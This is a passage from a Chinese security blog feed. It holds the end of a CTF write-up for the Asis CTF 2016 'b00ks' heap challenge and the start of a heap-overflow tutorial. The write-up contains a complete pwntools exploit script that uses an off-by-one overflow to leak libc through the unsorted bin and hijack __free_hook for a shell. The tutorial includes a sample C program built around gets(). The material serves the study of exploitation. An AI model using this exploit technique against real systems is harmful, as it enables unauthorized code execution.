class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果一"><a href="#结果一" class="headerlink" title="结果一"></a>结果一</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks27.png" alt="【Asis CTF 2016】b00ks27.png"></p><hr><h1 id="思路二（unsorted-bin）"><a href="#思路二（unsorted-bin）" class="headerlink" title="思路二（unsorted bin）"></a>思路二（unsorted bin）</h1><blockquote><p>本地环境：Glibc 2.23</p></blockquote><p>根据前面的分析我们知道，关键在于如何泄露 libc 的基地址</p><p>在思路一中，通过 <code>mmap</code> 方式分配的堆地址与 libc 基地址存在固定的偏移，根据这个固定偏移来计算 libc 基地址</p><p><em>另一种方法就是利用 <code>unsorted bin</code> 的特点来泄露 libc 基地址</em></p><blockquote><p>因为 <code>unsorted bin</code> 是双向链表，所以第一个 <code>unsorted bin</code> 的 <code>bk</code> 也就指向了 <code>bin[1]</code></p><p><strong>如果我们能够打印出第一个 <code>unsorted bin</code> 的 <code>bk</code>，也就相当于得到了 <code>bins[1]</code> 地址，而 <code>bins[1]</code> 在 libc 中，也就可以根据偏移计算 libc 基地址</strong></p></blockquote><p>而关键在于：得到一个 <code>unsorted bin</code> </p><p>我们知道，当 <code>free</code> 的 <code>chunk</code> 大小 &gt;&#x3D; 144 字节时，<code>chunk</code> 会放到 <code>unsorted bin</code> 中</p><p>因此，我们需要先创建第二本书，使其 <code>chunk</code> 的大小在 <code>free</code> 的时候大于 144 字节，这本书在后面是需要被 <code>free</code> 形成 <code>unsorted bin</code> 的，所以我们再创建第三本书，写入 <code>&#39;/bin/sh&#39;</code></p><p>创建三本书后如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks30.png" alt="【Asis CTF 2016】b00ks30.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks28.png" alt="【Asis CTF 2016】b00ks28.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks29.png" alt="【Asis CTF 2016】b00ks29.png"></p><p>接着还是通过 <code>Edit()</code> 功能伪造一个 <code>book[0]</code></p><ul><li><p>这次伪造的 <code>book[0] -&gt; name</code> 指向即将 <code>free</code> 后形成的 <code>unsorted bin</code> 的 <code>bk</code> 地址（<strong>注意：图中和脚本中实际指向的是 <code>fd</code> 地址，但由于这里只存在一个 unsorted bin，因此 <code>fd</code> 与 <code>bk</code> 指向同一地址，故不影响</strong>）</p></li><li><p>为了便于劫持 <code>__free_hook</code> 为 <code>system()</code>，我们将伪造的 <code>book[0] -&gt; description</code> 指向 <code>book[2]</code> 的 <code>description</code></p><p>  这样我们通过 <code>Edit(1, p64(free_hook_addr) + p64(0x10))</code> 修改 <code>book[0]</code> 的 <code>description</code> 的时候，就可以将 <code>book[2] -&gt; description</code> 修改为 <code>__free_hook</code></p><p>  然后再通过 <code>Edit(3, p64(system_addr))</code> 修改 <code>book[2]</code> 的 <code>description</code> 的时候，就可以将 <code>__free_hook</code> 修改为 <code>system()</code></p></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks31.png" alt="【Asis CTF 2016】b00ks31.png"></p><p>伪造好 <code>book[0]</code> 后，通过 <code>Change()</code> 功能填充 0x20 字节，溢出 1 字节 <code>&#39;\x00&#39;</code> 覆盖 <code>book[0]</code> 指针的最低位，使其指向我们伪造的 <code>book[0]</code></p><p>然后 <code>free</code> 掉 <code>book[1]</code> 后形成 <code>unsorted bin</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks32.png" alt="【Asis CTF 2016】b00ks32.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks33.png" alt="【Asis CTF 2016】b00ks33.png"></p><p>可以看到 <code>bk</code> 和 <code>fd</code> 指向的是同一个地址，打印其中之一即可</p><p>通过 <code>Print()</code> 功能在 <code>Name</code> 处打印出了 <code>fd</code>、<code>bk</code> 指针</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks34.png" alt="【Asis CTF 2016】b00ks34.png"></p><p>通过 GDB 可以看到 <code>fd</code>、<code>bk</code> 指针指向的地址为 <code>main_arena + 88</code> 处</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks35.png" alt="【Asis CTF 2016】b00ks35.png"></p><p>同时 <code>main_arena</code> 与 <code>__malloc_hook</code> 相距 0x10</p><p>因此根据偏移可以获得 <code>__malloc_hook</code> 的真实地址，而 <code>__malloc_hook</code> 是 libc 中的函数，根据 libc 偏移即可获得 libc 基地址</p><p>最后，利用前面提到的两次 <code>Edit()</code> 劫持 <code>__free_hook</code> 为 <code>system()</code></p><ol><li>第一次 <code>Edit()</code> 将 <code>book[2] -&gt; description</code> 修改为 <code>__free_hook</code>：</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks36.png" alt="【Asis CTF 2016】b00ks36.png"></p><ol start="2"><li>第二次 <code>Edit()</code> 将 <code>__free_hook</code> 修改为 <code>system()</code>：</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks37.png" alt="【Asis CTF 2016】b00ks37.png"></p><p>然后通过 <code>Delete()</code> 调用 <code>free</code> 执行 <code>system(/bin/sh)</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks38.png" alt="【Asis CTF 2016】b00ks38.png"></p><hr><h1 id="脚本二"><a href="#脚本二" class="headerlink" title="脚本二"></a>脚本二</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span><span class="token comment"># arch 可选 : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./b00ks"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./b00ks"</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># 只有本地才可调试，远程无法调试</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Create</span><span class="token punctuation">(</span>name_size<span class="token punctuation">,</span> name<span class="token punctuation">,</span> des_size<span class="token punctuation">,</span> des<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>name_size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>des_size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>des<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Delete</span><span class="token punctuation">(</span>book_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>book_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Edit</span><span class="token punctuation">(</span>book_id<span class="token punctuation">,</span> new_des<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>book_id<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>new_des<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Change</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Enter author name: '</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>Create<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'bbbb'</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'cccc'</span><span class="token punctuation">)</span>Print<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">)</span>book1_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'book1_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>book1_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>book2_addr <span class="token operator">=</span> book1_addr <span class="token operator">+</span> <span class="token number">0x30</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'book2_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>book2_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>Create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">b'cccc'</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">b'dddd'</span><span class="token punctuation">)</span>   <span class="token comment"># 为 unsorted bin 做准备</span>Create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">b'ffff'</span><span class="token punctuation">)</span>   <span class="token comment"># 存放 '/bin/sh'</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x40</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>book2_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>book2_addr <span class="token operator">+</span> <span class="token number">0x160</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>   <span class="token comment"># 伪造 book[0]</span>Change<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">)</span>   <span class="token comment"># 覆盖 book[0] 的最低位，改变其指向的地址为伪造的 book[0]</span>Delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>   <span class="token comment"># 形成 unsorted bin</span>Print<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment"># 泄露 unsorted bin 的 bk 指针</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Name: '</span><span class="token punctuation">)</span>main_arena_88 <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>main_arena_addr <span class="token operator">=</span> main_arena_88 <span class="token operator">-</span> <span class="token number">88</span>malloc_hook_addr <span class="token operator">=</span> main_arena_addr <span class="token operator">-</span> <span class="token number">0x10</span>   <span class="token comment"># 根据偏移得到 __malloc_hook 真实地址</span>libc_base <span class="token operator">=</span> malloc_hook_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>   <span class="token comment"># 得到 libc 基地址</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'main_arena_88 -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>main_arena_88<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'main_arena_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>main_arena_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'malloc_hook_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>free_hook_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>one_gadget_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x4527a</span>   <span class="token comment"># 0x45226 0x4527a 0xf03a4 0xf1247</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'free_hook_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'bin_sh_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'one_gadget_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>one_gadget_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 将 book3 -> description 修改为 __free_hook</span>Edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 将 __free_hook 修改为 system()</span><span class="token comment"># Edit(3, p64(one_gadget_addr))   # system(/bin/sh) 与 one_gadget 选其一即可</span>Delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果二"><a href="#结果二" class="headerlink" title="结果二"></a>结果二</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks39.png" alt="【Asis CTF 2016】b00ks39.png"></p>]]></content>
    
    
    <summary type="html">很经典的一道堆题，利用 off-by-one 漏洞修改指向堆的指针，然后伪造堆块，后续关键在于获得 libc 基地址，可以分别通过 mmap 的特点和 unsorted bin 的特点来计算 libc 偏移，最后劫持 __free_hook 获取 shell</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF" scheme="https://www.uf4te.cn/tags/CTF/"/>
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆相关漏洞与利用</title>
    <link href="https://www.uf4te.cn/posts/baa7ab63.html"/>
    <id>https://www.uf4te.cn/posts/baa7ab63.html</id>
    <published>2024-05-27T08:13:25.000Z</published>
    <updated>2024-06-06T10:08:03.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h1><blockquote><p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数 <mark>（注意：是写入的字节数超过了堆块本身可使用的字节数，而不是用户申请的字节数，因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数）</mark>，并覆盖到<strong>物理相邻的高地址</strong>的下一个堆块，轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程</p><p>一般来说，堆溢出漏洞需要两个前提：</p><ol><li><strong>程序向堆上写入数据</strong></li><li><strong>写入的数据大小没有被良好地控制</strong></li></ol><p>参考文章：</p><ol><li><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heapoverflow-basic/">堆溢出 - CTF Wiki</a></li></ol></blockquote><p><em>与栈溢出不同的是，堆上并不存在返回地址等可以让攻击者直接控制执行流程的数据，因此堆溢出通常无法像栈溢出一样直接控制 EIP</em></p><p>一般来说，我们利用堆溢出的策略是：</p><ol><li><p>覆盖与其<strong>物理相邻的下一个 <code>chunk</code></strong> 的内容</p><ul><li><code>prev_size</code></li><li><code>size</code>，主要有三个比特位，以及该堆块真正的大小<ul><li><code>NON_MAIN_ARENA</code></li><li><code>IS_MAPPED</code></li><li><code>PREV_INUSE</code></li><li><code>the True chunk size</code></li></ul></li><li><code>chunk content</code>，从而改变程序固有的执行流</li></ul></li><li><p>利用堆中的机制（如 <code>unlink</code> 等 ）来实现任意地址写入或控制堆块中的内容等效果，从而来控制程序的执行流</p></li></ol><blockquote><p>堆溢出通常需要配合其他的方法来实现漏洞的利用，比较常用的方法有：Chunk Extend and Overlap 等</p></blockquote><hr><h2 id="关键步骤"><a href="#关键步骤" class="headerlink" title="关键步骤"></a>关键步骤</h2><h3 id="寻找堆分配函数"><a href="#寻找堆分配函数" class="headerlink" title="寻找堆分配函数"></a>寻找堆分配函数</h3><blockquote><p>通常来说堆是通过调用 Glibc 函数 <code>malloc</code> 进行分配的，在某些情况下会使用 <code>calloc</code> 分配，<code>realloc</code> 同样也可以达到类似的效果</p><p>因此，常用的堆分配函数有：</p><ol><li><code>malloc</code></li><li><code>calloc</code></li><li><code>realloc</code></li></ol></blockquote><p><code>calloc</code> 与 <code>malloc</code> 的区别是 <strong>calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的</strong></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 等价于</span>ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><blockquote><p>通过寻找危险函数，可以快速确定程序是否可能存在堆溢出漏洞</p></blockquote><p>常见的危险函数如下</p><ul><li><p>输入</p><ul><li>gets，直接读取一行，忽略 <code>&#39;\x00&#39;</code></li><li>scanf</li><li>vscanf</li></ul></li><li><p>输出</p><ul><li>sprintf</li></ul></li><li><p>字符串</p><ul><li>strcpy，字符串复制，遇到 <code>&#39;\x00&#39;</code> 停止</li><li>strcat，字符串拼接，遇到 <code>&#39;\x00&#39;</code> 停止</li><li>bcopy</li></ul></li></ul><hr><h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><blockquote><p>这一部分主要是计算我们开始写入的地址与我们所要覆盖的地址之间的距离</p></blockquote><p>主要有以下几点需要重点注意：</p><ul><li><em><code>malloc</code> 的参数并不等于实际分配堆块的大小</em></li></ul><p><strong><code>ptmalloc2</code> 分配出来的大小是对齐的，这个长度一般是字长的 2 倍</strong>。比如 32 位系统是 8 字节，64 位系统是 16 字节</p><p>因此，<strong>对于不大于 2 倍字长的请求，<code>malloc</code> 会直接返回 2 倍字长的块（也就是最小 <code>chunk</code>）</strong>，比如 64 位系统执行 <code>malloc(0)</code> 会返回用户区域为 16 字节的块</p><ul><li><em>用户区域的大小不等于 <code>chunk_head.size</code></em></li></ul><pre class="line-numbers language-text" data-language="text"><code class="language-text">chunk_head.size = 用户区域大小 + 2 * 字长<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>用户申请的内存大小会被修改，有可能会使用与其物理相邻的下一个 <code>chunk</code> 的 <code>prev_size</code> 字段来储存内容</li></ul><p>例如：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>chunk<span class="token punctuation">;</span>  chunk <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Get input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上述代码中，申请的 <code>chunk</code> 大小是 24 字节</p><p>但是将其编译为 64 位可执行程序时，实际上分配的内存会是 16 字节而不是 24 字节</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//根据系统的位数，malloc 会分配 8 或 16 字节的用户空间</span><span class="token number">0x602000</span><span class="token operator">:</span>   <span class="token number">0x0000000000000000</span>  <span class="token number">0x0000000000000021</span><span class="token number">0x602010</span><span class="token operator">:</span>   <span class="token number">0x0000000000000000</span>  <span class="token number">0x0000000000000000</span><span class="token number">0x602020</span><span class="token operator">:</span>   <span class="token number">0x0000000000000000</span>  <span class="token number">0x0000000000020fe1</span><span class="token number">0x602030</span><span class="token operator">:</span>   <span class="token 